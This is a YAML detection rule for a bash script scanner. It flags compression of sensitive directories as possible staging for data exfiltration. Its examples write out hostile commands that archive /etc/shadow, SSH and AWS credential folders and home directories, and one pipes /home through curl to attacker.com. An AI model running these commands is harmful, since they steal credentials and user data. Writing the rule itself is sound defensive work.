# Bash Pattern: Suspicious File Compression
# Detects suspicious file compression for staging or exfiltration

id: BASH-018
name: Suspicious File Compression
description: |
  Detects suspicious file compression activities that may indicate data staging
  for exfiltration. Attackers compress sensitive files before exfiltration to
  reduce transfer time and evade detection. This pattern identifies compression
  of sensitive directories, password-protected archives, and unusual compression
  patterns.
languages:
  - bash
detection_type: regex
detection_logic: '(?:tar.*(?:/etc|/home|/root|\.ssh|\.aws).*\|.*(?:gzip|bzip2|xz)|zip.*-(?:e|P).*(?:/etc|/home|/root)|7z.*-p.*(?:/etc|/home)|rar.*-hp)'
severity: Medium
mitre_technique: T1560.001
confidence: 0.75
category: collection
enabled: true
metadata:
  author: Script Sentinel Team
  created: "2025-11-17"
  updated: "2025-11-17"
  references:
    - "https://attack.mitre.org/techniques/T1560/001/"
    - "https://attack.mitre.org/techniques/T1560/"
  tags:
    - bash
    - compression
    - data-staging
    - exfiltration
  examples:
    - "tar czf /tmp/data.tar.gz /etc /home 2>/dev/null"
    - "zip -e -P password /tmp/secrets.zip ~/.ssh/* ~/.aws/*"
    - "7z a -pSecretPass /tmp/archive.7z /root /etc/shadow"
    - "tar cf - /home | gzip | base64 | curl -d @- http://attacker.com/upload"